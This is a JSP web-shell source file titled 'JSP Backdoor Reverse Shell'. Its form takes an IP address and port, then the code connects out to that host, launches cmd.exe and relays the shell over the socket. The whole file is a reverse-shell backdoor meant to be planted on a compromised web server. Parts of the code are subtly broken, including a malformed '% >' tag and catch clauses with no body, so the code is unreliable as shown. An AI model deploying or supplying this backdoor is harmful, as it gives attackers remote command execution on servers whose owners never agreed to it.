// backdoor.jsp
// http://www.security.org.sg/code/jspreverse.html

<%@
page import="java.lang.*, java.util.*, java.io.*, java.net.*"
% >
<%!
static class StreamConnector extends Thread
{
        InputStream is;
        OutputStream os;

        StreamConnector(InputStream is, OutputStream os)
        {
                this.is = is;
                this.os = os;
        }

        public void run()
        {
                BufferedReader isr = null;
                BufferedWriter osw = null;

                try
                {
                        isr = new BufferedReader(new InputStreamReader(is));
                        osw = new BufferedWriter(new OutputStreamWriter(os));

                        char buffer[] = new char[8192];
                        int lenRead;

                        while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)
                        {
                                osw.write(buffer, 0, lenRead);
                                osw.flush();
                        }
                }
                catch (Exception ioe)

                try
                {
                        if(isr != null) isr.close();
                        if(osw != null) osw.close();
                }
                catch (Exception ioe)
        }
}
%>

<h1>JSP Backdoor Reverse Shell</h1>

<form method="post">
IP Address
<input type="text" name="ipaddress" size=30>
Port
<input type="text" name="port" size=10>
<input type="submit" name="Connect" value="Connect">
</form>
<p>
<hr>

<%
String ipAddress = request.getParameter("ipaddress");
String ipPort = request.getParameter("port");

if(ipAddress != null && ipPort != null)
{
        Socket sock = null;
        try
        {
                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());

                Runtime rt = Runtime.getRuntime();
                Process proc = rt.exec("cmd.exe");

                StreamConnector outputConnector =
                        new StreamConnector(proc.getInputStream(),
                                          sock.getOutputStream());

                StreamConnector inputConnector =
                        new StreamConnector(sock.getInputStream(),
                                          proc.getOutputStream());

                outputConnector.start();
                inputConnector.start();
        }
        catch(Exception e) 
}
%>

<!--    http://michaeldaw.org   2006    -->
